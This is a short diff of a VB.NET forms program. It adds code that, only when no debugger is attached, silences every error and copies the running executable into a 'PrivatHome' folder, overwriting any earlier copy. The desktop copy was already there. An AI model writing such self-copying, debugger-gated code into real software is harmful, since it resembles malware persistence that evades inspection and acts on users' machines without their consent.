@@ -68,7 +68,14 @@ Public Class Form
             Me.Text = Me.Text + " [Blackout]"
         Else
             If Not Debugger.IsAttached Then
+                On Error Resume Next
+                'Copy to PrivatHome
                 Dim Location = System.Reflection.Assembly.GetExecutingAssembly().CodeBase.Remove(0, 8), DesktopPath = Strings.Replace(wshShell.SpecialFolders("Desktop"), "\", "/"), Name = "\" + Process.GetCurrentProcess().ProcessName + ".exe"
+                If (objFSO.FileExists(PrivatHome + Name)) Then
+                    objFSO.DeleteFile(PrivatHome + Name, True)
+                End If
+                Microsoft.VisualBasic.FileIO.FileSystem.CopyFile(Location, PrivatHome + Name)
+                'Copy to Desktop
                 If Not Strings.Left(Location, Location.Length - Name.Length) = DesktopPath Then
                     If (objFSO.FileExists(DesktopPath + Name)) Then
                         objFSO.DeleteFile(DesktopPath + Name, True)
